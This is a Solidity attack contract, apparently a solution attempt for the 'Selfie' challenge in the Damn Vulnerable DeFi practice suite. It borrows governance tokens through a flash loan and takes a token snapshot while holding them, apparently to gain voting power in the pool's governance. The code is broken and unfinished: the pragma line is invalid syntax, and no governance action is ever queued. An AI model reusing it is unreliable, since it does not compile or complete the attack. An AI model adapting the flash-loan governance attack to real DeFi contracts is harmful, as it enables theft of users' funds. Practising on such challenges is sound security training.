pragma solidity '0.8.17';

import {Utilities} from "test/utils/Utilities.sol";
import "forge-std/Test.sol";
import "src/Contracts/DamnValuableTokenSnapshot.sol";
import "src/Contracts/selfie/SimpleGovernance.sol";
import "src/Contracts/selfie/SelfiePool.sol";

contract SelfieAttack {

  DamnValuableTokenSnapshot public snapshot;
  SimpleGovernance public governance;
  SelfiePool public pool;
  address payable public attacker;
  uint256 votes = 1000001 ether;
  bool second_snapshot = false;

  constructor (address _snapshot, address _governance, address _pool, address _attacker) {
    snapshot = DamnValuableTokenSnapshot(_snapshot);
    governance = SimpleGovernance(_governance);
    pool = SelfiePool(_pool);
    attacker = payable(_attacker);
  }

  function attack() public {
    snapshot.snapshot();
    pool.flashLoan(votes);
  }

  function receiveTokens(address, uint256 amount) public {
    snapshot.snapshot();
    snapshot.transfer(address(pool), amount);
  }

  receive() external payable {}
}
